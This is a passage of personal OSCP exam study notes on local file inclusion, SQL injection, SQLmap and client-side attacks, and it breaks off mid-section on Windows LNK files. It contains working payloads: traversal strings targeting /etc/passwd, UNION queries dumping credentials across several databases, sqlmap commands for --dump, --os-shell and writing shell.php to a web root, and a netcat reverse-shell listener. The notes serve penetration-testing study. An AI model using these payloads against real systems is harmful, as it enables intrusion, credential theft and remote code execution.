|Common target|`/etc/passwd`|Attacker-controlled resource|
|Configuration dependency|Lower|Often higher|
|RCE potential|Possible|Often straightforward if enabled|
|OSCP importance|**High**|Moderate|

**OSCP priority:** Learn LFI very well. RFI is useful, but actual RFI opportunities are less common.

---

## 15. Null Byte

Older PHP versions had vulnerabilities involving null-byte termination:

```
%00
```

Historically:

```
?page=../../../../etc/passwd%00
```

could sometimes bypass extensions such as:

```
.php
```

Modern PHP versions fixed the classic null-byte behavior, so this is mainly useful as **historical knowledge**.

---

## 16. Extension Bypass

Applications sometimes automatically append extensions:

```
include($_GET['page'] . ".php");
```

Input:

```
?page=../../../../etc/passwd
```

becomes:

```
../../../../etc/passwd.php
```

This prevents straightforward `/etc/passwd` inclusion.

Potential bypasses depend on the application's implementation and PHP version.

For OSCP, understand **why the appended extension matters** rather than memorizing outdated bypasses.

---

## 17. Absolute vs Relative Paths

### Relative

```
../../../../etc/passwd
```

### Absolute

```
/etc/passwd
```

Windows:

```
C:\Windows\win.ini
```

When testing LFI, try to determine whether the application expects:

- Relative paths
- Absolute paths
- A filename only
- A specific directory
- A file extension

---

## 18. URL Encoding

Applications may filter literal traversal characters.

Basic:

```
../
```

Encoded:

```
..%2f
```

Alternative slash encoding:

```
%2f
```

Backslash on Windows:

```
%5c
```

Double encoding:

```
%252e%252e%252f
```

The important concept is:

```
Input
 ↓
Web server decoding
 ↓
Application decoding
 ↓
Filesystem operation
```

Different layers may decode the input differently.

---

## 19. LFI Testing Methodology

### Step 1 — Identify file parameters

Search URLs and requests for:

```
file=
page=
path=
include=
template=
view=
document=
```

### Step 2 — Establish behavior

Change the parameter to an invalid value:

```
?page=doesnotexist
```

Observe:

- Error message
- Response size
- Status code
- Application behavior

### Step 3 — Test traversal

Try progressively:

```
../
../../
../../../
```

### Step 4 — Test known local files

Linux:

```
/etc/passwd
/etc/hostname
/etc/hosts
```

Windows:

```
C:\Windows\win.ini
```

### Step 5 — Identify the application

Look for:

```
PHP
Apache
Nginx
IIS
WordPress
Laravel
```

### Step 6 — Read source/configuration

If PHP:

```
php://filter
```

may be useful.

### Step 7 — Look for an RCE chain

Investigate:

```
LFI + Upload
LFI + Logs
LFI + Sessions
LFI + Writable files
```

---

## 20. Useful Enumeration Tools

### Burp Suite

Use Burp to:

- Intercept requests
- Modify parameters
- Compare responses
- Repeater-test LFI payloads
- Identify interesting parameters

### ffuf

Useful for discovering parameters/endpoints:

```
ffuf -u http://TARGET/page.php?FUZZ=test -w wordlist.txt
```

### Nuclei

Can help identify known LFI vulnerabilities and application-specific issues.

### curl

Useful for quick testing:

```
curl "http://TARGET/page.php?page=../../../../etc/passwd"
```

---

## 21. Common Mistakes

## ❌ Assuming every `file=` parameter is LFI

A parameter can simply be an identifier.

### ❌ Testing only `/etc/passwd`

Failure doesn't necessarily mean the application isn't vulnerable.

Possible reasons:

- Wrong traversal depth
- Absolute paths blocked
- Extension appended
- Filtering
- Different operating system
- Application sanitization

### ❌ Assuming LFI = RCE

LFI may only provide file disclosure.

### ❌ Ignoring source code

If you can read application source, it may reveal the **actual filesystem paths and logic**.

### ❌ Using outdated payloads blindly

Many old LFI bypasses depended on old PHP versions/configurations.

---

## 22. OSCP Cheat Sheet

```
LFI
│
├── Identify parameters
│   ├── file=
│   ├── page=
│   ├── path=
│   ├── include=
│   └── template=
│
├── Test traversal
│   ├── ../
│   ├── ../../
│   └── encoded traversal
│
├── Linux
│   ├── /etc/passwd
│   ├── /etc/hosts
│   ├── /etc/hostname
│   ├── /proc/self/environ
│   └── /proc/self/cmdline
│
├── Windows
│   ├── C:\Windows\win.ini
│   └── C:\Windows\System32\drivers\etc\hosts
│
├── PHP
│   └── php://filter
│
└── Potential RCE chains
    ├── LFI + Log Poisoning
    ├── LFI + File Upload
    ├── LFI + Session Files
    └── LFI + Writable File
```

##  OSCP Priority

**Know extremely well:**

1. Path traversal
2. LFI identification
3. Linux/Windows filesystem basics
4. `php://filter`
5. Reading application source
6. LFI + log poisoning concept
7. LFI + upload concept
8. Difference between LFI/RFI
9. Recognizing when LFI can become RCE
10. Understanding why a payload fails rather than just changing payloads blindly.
## must vuln parameters
![[Pasted image 20260909190504.png]]
## to Automate
![[Pasted image 20260909192235.png]]

# ==Introduction to SQL injection==
![[common-sql-injection-attacks.webp]]
## 1. What is SQL Injection?

**SQL Injection (SQLi)** is a vulnerability that occurs when an application takes **user-controlled input** and places it into an SQL query without properly validating or parameterizing that input.

The attacker can manipulate the SQL query to change what the database executes.

### Simple example

Application code:

```
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Normal input:

```
username = admin
password = password123
```

The database receives:

```
SELECT * FROM users
WHERE username = 'admin'
AND password = 'password123';
```

If the application is vulnerable, specially crafted input can alter the query's logic.

---

## 2. Why SQL Injection Happens

The fundamental problem is **mixing data with SQL code**.

### Vulnerable

```
$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";
```

User input becomes part of the SQL statement.

### Secure

```
$stmt = $pdo->prepare(
    "SELECT * FROM users WHERE username = ?"
);
$stmt->execute([$username]);
```

Here, the database treats `$username` as **data**, not SQL code.

---

## 3. Where to Look for SQLi

SQL injection can potentially exist anywhere user input reaches a database query.

Common locations:

### URL parameters

```
/product?id=10
```

### POST parameters

```
username=admin
password=test
```

### Search functionality

```
/search?q=laptop
```

### HTTP headers

Potentially:

```
User-Agent
Referer
X-Forwarded-For
Cookie
```

### JSON APIs

```
{
  "id": 10,
  "search": "laptop"
}
```

### GraphQL

Arguments may eventually be used in database queries.

---

## 4. Basic SQLi Detection

During an authorized OSCP lab, first determine whether your input affects the SQL query.

Useful initial tests include:

```
'
"
`
```

and sometimes:

```
')
")
```

You're looking for:

- SQL syntax errors
- Different HTTP response
- Different response length
- Changed application behavior
- HTTP 500 errors
- Database-specific error messages

### Example

Normal:

```
?id=10
```

Test:

```
?id=10'
```

If the application suddenly returns a database error, that's a strong indication that the parameter may be reaching an SQL query.

**Important:** an error alone doesn't prove exploitable SQLi. You still need to establish that you can influence query behavior.

---

## 5. Main Types of SQL Injection

For OSCP, know these categories:

|Type|Description|
|---|---|
|**Error-based**|Database errors reveal useful information|
|**Union-based**|`UNION` is used to combine query results|
|**Boolean-based blind**|Infer information from TRUE/FALSE behavior|
|**Time-based blind**|Infer information from response delays|
|**Out-of-band**|Database communicates with an external system|

The most important distinction is:

### In-band SQLi

You directly see the database results in the application's response.

### Blind SQLi

The application doesn't directly show database results, so you infer information from behavior.

---

## 6. Authentication Bypass Concept

A classic SQLi scenario is an application's login query:

```
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

If input is unsafely concatenated, an attacker may attempt to manipulate the `WHERE` condition.

The important concept for OSCP is:

> **SQL injection can change the logic of the SQL query, potentially causing authentication or authorization decisions to behave differently.**

Don't memorize one magic payload. Understand **why** the query changes.

---

## 7. UNION-Based SQL Injection

`UNION` allows results from another `SELECT` statement to be combined with the original query.

Conceptually:

```
SELECT name FROM products
UNION
SELECT username FROM users;
```

For a UNION attack to work, the two queries generally need compatible:

- Number of columns
- Data types in corresponding positions

### Finding the number of columns

In a lab, common approaches include:

```
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

Continue increasing the column number until the query produces an error.

Another approach is using `NULL` values:

```
UNION SELECT NULL
```

then:

```
UNION SELECT NULL,NULL
```

then:

```
UNION SELECT NULL,NULL,NULL
```

The goal is to determine the expected number of columns.

---

## 8. Identifying Useful Columns

Once you know the number of columns, determine which positions can display text.

Example:

```
UNION SELECT NULL,'test',NULL
```

If `test` appears in the HTTP response, the second column is reflected.

This can help identify where database information might become visible.

---

## 9. Database Enumeration

Once SQLi is confirmed, the next objective is usually understanding the database environment.

Important information includes:

```
DBMS
Database version
Current database
Current user
Database names
Tables
Columns
Data
```

Common DBMS:

- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

**OSCP tip:** identify the DBMS before blindly trying syntax. SQL syntax differs between database engines.

---

## 10. Database Structure

Think about the database hierarchy:

```
Database
 ├── Tables
 │    ├── Columns
 │    └── Rows
 └── Other objects
```

For example:

```
company_db
 ├── users
 │    ├── id
 │    ├── username
 │    └── password
 │
 └── products
      ├── id
      ├── name
      └── price
```

Your goal during enumeration is often to move from:

```
DBMS
 ↓
Database
 ↓
Tables
 ↓
Columns
 ↓
Interesting data
```

---

## 11. Blind SQL Injection

Sometimes the application doesn't display database errors or query results.

Example:

```
?id=10
```

returns:

```
Product found
```

while another condition returns:

```
Product not found
```

You can use this difference to infer information.

Conceptually:

```
Is condition TRUE?
        ↓
    Response A
        ↓
Is condition FALSE?
        ↓
    Response B
```

This is **Boolean-based blind SQLi**.

---

## 12. Time-Based Blind SQLi

Sometimes there isn't even a visible difference between TRUE and FALSE responses.

A database can potentially be instructed to introduce a measurable delay when a condition is true.

Conceptually:

```
Condition TRUE
      ↓
Database waits
      ↓
Slow response
```

versus:

```
Condition FALSE
      ↓
No delay
      ↓
Normal response
```

This allows information to be inferred from timing.

For OSCP, understand the concept and recognize database-specific syntax rather than memorizing random payloads.

---

## 13. SQL Injection → OS Command Execution

SQLi doesn't automatically mean **RCE**.

However, depending on:

- DBMS
- Database privileges
- Server configuration
- Enabled database features
- Operating system
- Application architecture

SQL injection can sometimes be escalated toward:

```
SQLi
 ↓
Database privileges/features
 ↓
File read/write or dangerous functionality
 ↓
Potential command execution
```

This is highly DBMS-specific.

---

## 14. SQLMap

sqlmap is a popular automated SQL injection testing tool.

Typical workflow:

```
Manual discovery
       ↓
Confirm suspected SQLi
       ↓
Identify DBMS
       ↓
Use SQLMap when appropriate
       ↓
Enumerate database
       ↓
Extract relevant information
```

Example in an authorized lab:

```
sqlmap -u "http://target/item?id=1"
```

For a POST request, you can provide the request captured from Burp:

```
sqlmap -r request.txt
```

Useful enumeration concepts include:

```
--current-user
--current-db
--dbs
--tables
--columns
```

Don't immediately run SQLMap against every parameter. **Manual understanding is important for OSCP.**

---

## 15. Burp Suite + SQLi

A useful OSCP workflow:

```
Browser
   ↓
Burp Proxy
   ↓
Capture request
   ↓
Identify parameters
   ↓
Send to Repeater
   ↓
Modify parameter
   ↓
Compare responses
   ↓
Confirm SQLi
   ↓
Enumerate
```

Pay attention to:

- Status code
- Response length
- Response body
- Error messages
- Response time
- Redirect behavior

---

## 16. SQLi Methodology — OSCP

Use this mental checklist:

```
1. Identify input points
        ↓
2. Test for SQL behavior
        ↓
3. Confirm vulnerability
        ↓
4. Identify DBMS
        ↓
5. Determine SQLi type
        ↓
6. Determine column count if UNION-based
        ↓
7. Find reflected/useful columns
        ↓
8. Enumerate database structure
        ↓
9. Extract relevant data
        ↓
10. Check for further impact
```

---

## 17. What to Memorize for OSCP

### Must understand

- What SQL injection is
- Why string concatenation causes SQLi
- Difference between normal and blind SQLi
- Error-based SQLi
- UNION-based SQLi
- Boolean-based SQLi
- Time-based SQLi
- How to determine column count
- How to identify useful UNION columns
- Basic database enumeration
- SQLMap basics
- Burp Repeater workflow
- DBMS-specific differences

### Don't rely on memorization

 Random payload lists  
 One universal SQLi payload  
 Running SQLMap without understanding the request  
 Assuming SQLi automatically gives RCE

The OSCP-relevant skill is:

> **Recognize the injection point → understand the query behavior → identify the DBMS → enumerate methodically → turn the finding into useful impact.**

## Where can I find it ?

### Where is the mistake ?
### Where can i inject my payload ?
. SQL Injection Can be in GET based
. Http://limbo.com/index.php?id=1
. SQL Injection Can be in POST based
. Html form like login page .
. SQL Injection Can be in Header based
. Header parameter like Referrer, host, or User agent .
### SQL Injection Can be in Cookie based
. Cookie: id-123123;


# ==Exploit SQL injection==
![[369-3696460_sql-injection-sql-injection-png.png]]
## 1. Goal of Exploiting SQLi

After confirming SQL Injection, the goal is to use it to gain **useful access or information**.

Typical progression:

```
Find SQLi
   ↓
Identify DBMS
   ↓
Determine SQLi type
   ↓
Enumerate database
   ↓
Extract useful data
   ↓
Try to escalate impact
```

---

## 2. Authentication Bypass

A vulnerable login query may look like:

```
SELECT * FROM users
WHERE username = '$user'
AND password = '$pass';
```

If input is directly inserted into the query, SQL syntax can potentially alter the `WHERE` condition.

The important idea:

```
Normal input
     ↓
Normal SQL query
     ↓
Authentication check

Malicious input
     ↓
Modified SQL query
     ↓
Authentication logic changed
```

**OSCP focus:** understand how the injected SQL changes the original query rather than memorizing a single payload.

---

## 3. UNION-Based Exploitation

`UNION` can combine the application's query with another `SELECT`.

Example concept:

```
SELECT name FROM products
UNION
SELECT username FROM users;
```

The main requirements are:

1. Determine the number of columns.
2. Make the column count match.
3. Determine which columns can display useful data.
4. Query interesting database information.

### Finding column count

Try:

```
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

Increase the number until the query fails.

Or use:

```
UNION SELECT NULL
UNION SELECT NULL,NULL
UNION SELECT NULL,NULL,NULL
```

---

## 4. Extracting Data

Once the UNION structure works, you can target interesting information such as:

```
Usernames
Passwords/hashes
API keys
Tokens
Email addresses
Application data
```

Conceptually:

```
SQLi
 ↓
UNION
 ↓
Database tables
 ↓
Interesting columns
 ↓
Sensitive data
```

Always focus on **relevant impact**, not dumping the entire database unnecessarily.

---

## 5. Database Enumeration

A common exploitation path is:

```
Current DBMS
      ↓
Current database
      ↓
Database names
      ↓
Tables
      ↓
Columns
      ↓
Rows
```

Useful questions:

```
What DBMS is running?
Which database am I using?
What tables exist?
Which tables contain users?
Which columns contain credentials?
```

---

## 6. Blind SQLi Exploitation

If the application doesn't return database results, use its behavior as your output channel.

### Boolean-based

```
Inject condition
      ↓
TRUE  → Response A
FALSE → Response B
```

For example, you may determine information one character at a time by asking the database logical questions.

### Time-based

```
Condition TRUE
      ↓
Database delays
      ↓
Slow response

Condition FALSE
      ↓
Normal response
```

This is slower, but can work when there is no visible response difference.

---

## 7. Reading Files

Some DBMS configurations/features may allow SQLi to interact with files on the underlying server.

Potential impact:

```
SQL Injection
      ↓
Database file functionality
      ↓
Read sensitive server files
```

This is **DBMS- and privilege-dependent**.

Don't assume that finding SQLi automatically gives arbitrary file read.

---

## 8. Writing Files

In certain configurations, SQL functionality may allow writing files to the server.

Conceptually:

```
SQLi
 ↓
Database file-write capability
 ↓
Write attacker-controlled file
 ↓
Potential application-level execution
```

This depends heavily on:

- DBMS
- Database privileges
- Server permissions
- File location
- Web-server configuration

---

## 9. SQLi → RCE

SQL Injection can sometimes lead to **Remote Code Execution**, but this is not guaranteed.

Possible chain:

```
SQLi
 ↓
High database privileges
 ↓
Dangerous DBMS functionality
 ↓
OS interaction
 ↓
Command execution
 ↓
RCE
```

For OSCP, remember:

> **SQLi is the vulnerability; RCE is a possible escalation, not an automatic result.**

---

## 10. SQLMap

After manually confirming the vulnerability, SQLMap can automate exploitation.

Basic:

```
sqlmap -u "http://target/item?id=1"
```

Using a Burp request:

```
sqlmap -r request.txt
```

Common enumeration:

```
sqlmap -u "URL" --current-user
sqlmap -u "URL" --current-db
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D database --tables
sqlmap -u "URL" -D database -T users --columns
```

Dump a specific table:

```
sqlmap -u "URL" -D database -T users --dump
```

---

## 11. OSCP Exploitation Workflow

```
1. Identify injectable parameter
          ↓
2. Confirm SQLi manually
          ↓
3. Identify DBMS
          ↓
4. Identify SQLi type
          ↓
5. Determine column count
          ↓
6. Find useful columns
          ↓
7. Enumerate databases/tables
          ↓
8. Extract useful information
          ↓
9. Check database privileges
          ↓
10. Look for file/OS interaction
          ↓
11. Escalate to RCE if possible
```

---

## 12. Quick OSCP Cheat Sheet

|Objective|Technique|
|---|---|
|Detect SQLi|`'`, `"`, syntax/behavior changes|
|Auth bypass|Manipulate `WHERE` logic|
|Find columns|`ORDER BY`, `UNION SELECT NULL...`|
|Display data|UNION-based SQLi|
|No visible output|Boolean-based SQLi|
|No response difference|Time-based SQLi|
|Enumerate DB|DBMS-specific queries / SQLMap|
|Automate|SQLMap|
|File interaction|DBMS-specific features + privileges|
|RCE|DBMS/privilege/configuration dependent|

### Key mindset

**Don't think:**

```
SQLi → dump database
```

Think:

```
SQLi
 ↓
What query am I controlling?
 ↓
What DBMS?
 ↓
What privileges?
 ↓
What information/behavior can I control?
 ↓
What's the highest practical impact?
```

That mindset is much more useful for OSCP than memorizing payloads.



# ==SQL injection Dumping all database==
![[Pasted image 20261005172654.png|700]]
### 1. Goal

After confirming **SQL Injection**, the next step may be to enumerate and extract database information.

Typical objectives:

- Identify the **DBMS**.
- Identify available **databases**.
- Enumerate **tables**.
- Enumerate **columns**.
- Dump interesting data such as users, emails, hashes, API keys, etc.

---

### 2. Basic Enumeration Flow

```
SQL Injection
     ↓
Identify DBMS
     ↓
Enumerate Databases
     ↓
Enumerate Tables
     ↓
Enumerate Columns
     ↓
Dump Data
```

---

### 3. MySQL / MariaDB

**List databases:**

```
UNION SELECT GROUP_CONCAT(schema_name),NULL
FROM information_schema.schemata--
```

**List tables in the current database:**

```
UNION SELECT GROUP_CONCAT(table_name),NULL
FROM information_schema.tables
WHERE table_schema=database()--
```

**List columns:**

```
UNION SELECT GROUP_CONCAT(column_name),NULL
FROM information_schema.columns
WHERE table_name='users'--
```

**Dump data:**

```
UNION SELECT GROUP_CONCAT(username,':',password),NULL
FROM users--
```

`information_schema` is especially important because it contains metadata about databases, tables, and columns.

---

### 4. SQL Server

**List databases:**

```
UNION SELECT STRING_AGG(name,','),NULL
FROM sys.databases--
```

**List tables:**

```
UNION SELECT STRING_AGG(name,','),NULL
FROM sys.tables--
```

**List columns:**

```
UNION SELECT STRING_AGG(name,','),NULL
FROM sys.columns
WHERE object_id = OBJECT_ID('users')--
```

---

### 5. PostgreSQL

**List databases:**

```
UNION SELECT string_agg(datname,','),NULL
FROM pg_database--
```

**List tables:**

```
UNION SELECT string_agg(table_name,','),NULL
FROM information_schema.tables
WHERE table_schema='public'--
```

**List columns:**

```
UNION SELECT string_agg(column_name,','),NULL
FROM information_schema.columns
WHERE table_name='users'--
```

---

### 6. SQLite

SQLite is different because it doesn't have `information_schema`.

**List tables:**

```
UNION SELECT group_concat(name),NULL
FROM sqlite_master
WHERE type='table'--
```

**Get table definition:**

```
UNION SELECT sql,NULL
FROM sqlite_master
WHERE name='users'--
```

The table definition can reveal the column names.

---

### 7. `sqlmap` — Automated Dumping

Once SQLi is confirmed, `sqlmap` can automate enumeration and dumping:

```
sqlmap -u "http://target.com/page?id=1" --dbs
```

List tables:

```
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
```

List columns:

```
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns
```

Dump a table:

```
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

Dump everything from a database:

```
sqlmap -u "http://target.com/page?id=1" -D database_name --dump
```

---

### 8. OSCP Mental Model

Remember:

```
--dbs
   ↓
Databases

--tables
   ↓
Tables

--columns
   ↓
Columns

--dump
   ↓
Data
```

**Important:** Don't immediately try to dump everything manually. First understand the database structure and identify the tables containing useful information. This makes exploitation faster and reduces unnecessary requests.


# ==SQLmap==
![[Sqlmap_logo.png]]
## 1. What is SQLmap?

**SQLmap** is an automated tool used to **detect and exploit SQL Injection (SQLi)** vulnerabilities.

It can help with:

- Detecting SQL Injection
- Identifying the DBMS
- Enumerating databases
- Enumerating tables and columns
- Dumping database contents
- Extracting database users
- Testing authentication-related SQLi
- Reading/writing files in some DBMS configurations
- Obtaining OS-level access in certain cases

> **OSCP mindset:** Don't blindly run `sqlmap --dump`. First understand **where the SQLi is, what parameter is injectable, and what DBMS you're dealing with.**

---

## 2. Basic Syntax

```
sqlmap -u "http://TARGET/page.php?id=1"
```

`-u` specifies the target URL.

Example:

```
sqlmap -u "http://10.10.10.10/products.php?id=1"
```

---

## 3. GET Parameter Testing

If the URL contains:

```
?id=1
```

Run:

```
sqlmap -u "http://TARGET/page.php?id=1"
```

Test a specific parameter:

```
sqlmap -u "http://TARGET/page.php?id=1&cat=2" -p id
```

`-p` = parameter to test.

---

## 4. POST Request

For POST-based SQLi:

```
sqlmap -u "http://TARGET/login.php" \
--data="username=test&password=test"
```

SQLmap will test the POST parameters.

Specific parameter:

```
sqlmap -u "http://TARGET/login.php" \
--data="username=test&password=test" \
-p username
```

---

## 5. Using a Burp Request

Save the HTTP request from Burp Suite:

```
request.txt
```

Then:

```
sqlmap -r request.txt
```

This is extremely useful because the request can contain:

- Cookies
- Headers
- POST parameters
- CSRF tokens
- Authentication information

Example:

```
POST /login HTTP/1.1
Host: TARGET
Cookie: session=abc123

username=test&password=test
```

Then:

```
sqlmap -r request.txt
```

---

## 6. Finding the DBMS

SQLmap can identify the database automatically:

```
sqlmap -u "http://TARGET/page.php?id=1"
```

You may see something like:

```
back-end DBMS: MySQL
```

Common DBMS:

- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

You can also specify it if already known:

```
--dbms=mysql
```

---

## 7. Enumerate Databases

```
sqlmap -u "http://TARGET/page.php?id=1" --dbs
```

`--dbs` = enumerate databases.

Example result:

```
[*] information_schema
[*] webapp
[*] users
```

---

## 8. Enumerate Tables

First specify the database:

```
sqlmap -u "http://TARGET/page.php?id=1" \
-D webapp --tables
```

`-D` = database.

`--tables` = enumerate tables.

---

## 9. Enumerate Columns

```
sqlmap -u "http://TARGET/page.php?id=1" \
-D webapp -T users --columns
```

`-T` = table.

`--columns` = enumerate columns.

Example:

```
id
username
password
email
```

---

## 10. Dump Data

Dump an entire table:

```
sqlmap -u "http://TARGET/page.php?id=1" \
-D webapp -T users --dump
```

Dump a specific column:

```
sqlmap -u "http://TARGET/page.php?id=1" \
-D webapp -T users -C username,password --dump
```

`-C` = columns.

---

## 11. Dump the Current Database

```
sqlmap -u "http://TARGET/page.php?id=1" --current-db
```

Returns the database currently being used by the application.

---

## 12. Database Users

```
sqlmap -u "http://TARGET/page.php?id=1" --users
```

Database user privileges:

```
sqlmap -u "http://TARGET/page.php?id=1" --privileges
```

---

## 13. Current DB User

```
sqlmap -u "http://TARGET/page.php?id=1" --current-user
```

Useful for understanding what privileges the application has.

---

## 14. Tables → Columns → Data

A common OSCP workflow:

```
SQL Injection
     ↓
Identify DBMS
     ↓
--dbs
     ↓
-D database --tables
     ↓
-D database -T table --columns
     ↓
-D database -T table --dump
```

Example:

```
sqlmap -u "http://TARGET/item.php?id=1" --dbs

sqlmap -u "http://TARGET/item.php?id=1" \
-D webapp --tables

sqlmap -u "http://TARGET/item.php?id=1" \
-D webapp -T users --columns

sqlmap -u "http://TARGET/item.php?id=1" \
-D webapp -T users --dump
```

---

## 15. SQLmap Risk & Level

SQLmap has two important options:

### `--level`

Controls how many places/parameters SQLmap tests.

```
--level=1
```

Default.

Higher:

```
--level=5
```

More extensive testing.

### `--risk`

Controls potentially dangerous tests.

```
--risk=1
```

Default.

Higher:

```
--risk=3
```

Potentially more aggressive tests.

**OSCP:** Start with defaults, increase only when necessary.

---

## 16. Specify Injection Technique

SQLmap supports different SQLi techniques:

```
B = Boolean-based blind
E = Error-based
U = UNION query
S = Stacked queries
T = Time-based blind
Q = Inline queries
```

Example:

```
sqlmap -u "http://TARGET/page.php?id=1" --technique=BEU
```

This tells SQLmap to focus on:

- Boolean
- Error
- UNION

---

## 17. UNION Enumeration

If UNION-based SQLi is suspected:

```
sqlmap -u "http://TARGET/page.php?id=1" \
--technique=U
```

SQLmap can determine things such as:

```
number of columns
UNION compatibility
extractable information
```

---

## 18. Authentication / Cookies

For an authenticated target:

```
sqlmap -u "http://TARGET/page.php?id=1" \
--cookie="PHPSESSID=abc123"
```

Or preferably use a Burp request:

```
sqlmap -r request.txt
```

This preserves the original request context.

---

## 19. Headers

You can provide custom headers:

```
sqlmap -u "http://TARGET/page.php?id=1" \
--headers="Authorization: Bearer TOKEN"
```

Multiple headers:

```
--headers="X-Test: 123\nAuthorization: Bearer TOKEN"
```

---

## 20. Enumerate Hostname

```
sqlmap -u "http://TARGET/page.php?id=1" --hostname
```

Can reveal the database server hostname.

---

## 21. SQL Shell

If SQLmap has sufficient access:

```
sqlmap -u "http://TARGET/page.php?id=1" --sql-shell
```

You can then execute SQL queries.

Example:

```
SELECT user,host FROM mysql.user;
```

---

## 22. OS Shell

In certain configurations SQLmap may be able to obtain an OS shell:

```
sqlmap -u "http://TARGET/page.php?id=1" --os-shell
```

**Important:** This does **not** work simply because SQLi exists.

It depends on things such as:

- DBMS
- Database privileges
- DBMS configuration
- File permissions
- OS
- Available functions/features

---

## 23. File Read

In supported configurations:

```
sqlmap -u "http://TARGET/page.php?id=1" \
--file-read="/etc/passwd"
```

On Windows, for example:

```
--file-read="C:/Windows/win.ini"
```

---

## 24. File Write

SQLmap can potentially write files:

```
sqlmap -u "http://TARGET/page.php?id=1" \
--file-write="shell.php" \
--file-dest="/var/www/html/shell.php"
```

This requires appropriate DB/server privileges and configuration.

---

## 25. Useful Enumeration Options

|Option|Purpose|
|---|---|
|`-u`|Target URL|
|`-r`|Load HTTP request|
|`-p`|Test specific parameter|
|`--data`|POST data|
|`--cookie`|Add cookies|
|`--dbs`|Enumerate databases|
|`--tables`|Enumerate tables|
|`--columns`|Enumerate columns|
|`--dump`|Dump database data|
|`--current-db`|Current database|
|`--current-user`|Current DB user|
|`--users`|Database users|
|`--passwords`|Database password hashes|
|`--privileges`|User privileges|
|`--hostname`|Database hostname|
|`--sql-shell`|SQL shell|
|`--os-shell`|OS shell|
|`--file-read`|Read server-side file|
|`--file-write`|Write server-side file|
|`--dbms`|Specify DBMS|
|`--level`|Increase testing coverage|
|`--risk`|Increase test risk|
|`--technique`|Select SQLi techniques|

---

## 26. OSCP Practical Workflow

```
# 1. Test the URL
sqlmap -u "http://TARGET/page.php?id=1"

# 2. If vulnerable, enumerate DBs
sqlmap -u "http://TARGET/page.php?id=1" --dbs

# 3. Enumerate tables
sqlmap -u "http://TARGET/page.php?id=1" \
-D DBNAME --tables

# 4. Enumerate columns
sqlmap -u "http://TARGET/page.php?id=1" \
-D DBNAME -T TABLENAME --columns

# 5. Dump useful data
sqlmap -u "http://TARGET/page.php?id=1" \
-D DBNAME -T TABLENAME --dump

# 6. Check privileges
sqlmap -u "http://TARGET/page.php?id=1" \
--current-user --privileges

# 7. If the environment allows it
sqlmap -u "http://TARGET/page.php?id=1" --os-shell
```

### **OSCP Rule of Thumb**

Don't waste time letting SQLmap perform everything automatically.

Think:

**Find injection → identify DBMS → enumerate → extract useful data → use credentials/access → escalate.**

And when you already have the exact HTTP request from Burp, **`sqlmap -r request.txt` is often the cleanest approach.**


# ==Client-Side Attacks==
![[Client-side-server-side-ab-testing.webp]]
## 1. What is a Client-Side Attack?

A **client-side attack** targets the **user's machine/application**, not the server directly.

**Attacker → Malicious content → Victim's computer**

Examples:

- Malicious documents
- Malicious links
- Browser-based exploits
- Malicious files/applications
- Social engineering

---

## 2. Common Client-Side Attacks

|Attack|Target|Example|
|---|---|---|
|**Malicious Document**|Office/PDF apps|`.doc`, `.xls`, etc.|
|**Phishing**|User|Fake login/link|
|**Browser Exploitation**|Web browser|Exploit browser vulnerability|
|**Malicious Executable**|OS/User|`.exe`|
|**Macro Attacks**|Office|Malicious VBA macro|
|**Drive-by Download**|Browser|Automatic/malicious download|
|**Client-Side RCE**|Victim machine|Exploit vulnerable client software|

---

## 3. Client-Side vs Server-Side

**Server-side:**

```
Attacker → Server
```

You exploit a vulnerability in the server/application.

Examples:

- SQL Injection
- Command Injection
- RCE
- File Inclusion

**Client-side:**

```
Attacker → Victim
```

You need the victim to interact with or open something malicious.

Examples:

- Malicious Word document
- Malicious link
- Browser exploit

---

## 4. Important OSCP Concept

The biggest challenge is usually:

> **How do I get the victim to execute/interact with my payload?**

For example:

```
Create malicious document
        ↓
Send to victim
        ↓
Victim opens document
        ↓
Payload executes
        ↓
Reverse shell
        ↓
Attacker
```

So client-side attacks often involve **social engineering + exploitation**.

---

## 5. Reverse Shell Connection

A common lab scenario:

```
Victim opens malicious file
        ↓
Payload executes
        ↓
Victim connects back
        ↓
Attacker receives shell
```

You normally need:

```
nc -lvnp 4444
```

to listen for the connection.

---

## 6. Things to Enumerate

When performing OSCP client-side testing, look for:

- OS version
- Browser version
- Office version
- PDF reader version
- Installed applications
- Architecture: x86 / x64
- Security controls
- User privileges
- Available network connectivity

Useful commands after obtaining access:

```
systeminfo
```

```
whoami
```

```
wmic product get name,version
```

PowerShell:

```
Get-ComputerInfo
```

---

## 7. Key OSCP Mindset

Don't immediately think:

> "Which exploit can I use?"

Think:

```
What software does the victim use?
        ↓
Is that software vulnerable?
        ↓
Can I make the victim interact with my payload?
        ↓
Can I obtain code execution?
        ↓
Can I get a shell?
```

### Remember

**Client-side = attack the victim/client.**

**Server-side = attack the server.**

For OSCP, focus especially on **malicious documents, client software vulnerabilities, payload delivery, and obtaining a reverse shell**.
## Client-Side Attacks – OSCP

## Microsoft Office & Exploiting Windows Explorer

### 1. Microsoft Office Attacks

Client-side attacks often target users through files they open, especially **Microsoft Office documents**.

Common attack surface:

- Word (`.doc`, `.docx`)
- Excel (`.xls`, `.xlsx`)
- PowerPoint (`.ppt`, `.pptx`)
- RTF (`.rtf`)

Typical idea:

```
Attacker → Malicious Office File → Victim Opens File → Vulnerability/Feature Abuse → Code Execution
```

### 2. Malicious Macros

Older Office attacks commonly abused **VBA macros**.

A malicious document can contain a macro that executes when the victim enables macros.

Conceptually:

```
Open document
      ↓
Enable Macros
      ↓
VBA executes
      ↓
Command / Payload
```

**Important:** Modern Microsoft Office has protections that make this technique less reliable than it historically was.

---

## Exploiting Windows Explorer

Windows Explorer (`explorer.exe`) is the Windows file-management interface and is also involved in displaying files, folders, shortcuts, and network locations.

For OSCP, an important concept is that **opening or interacting with a seemingly harmless file can trigger unintended behavior**.

### LNK Files

Windows shortcut files use the:

```
.lnk
```

extension.

A shortcut can point to a program, script, executable, or other location.

Example concept:

```
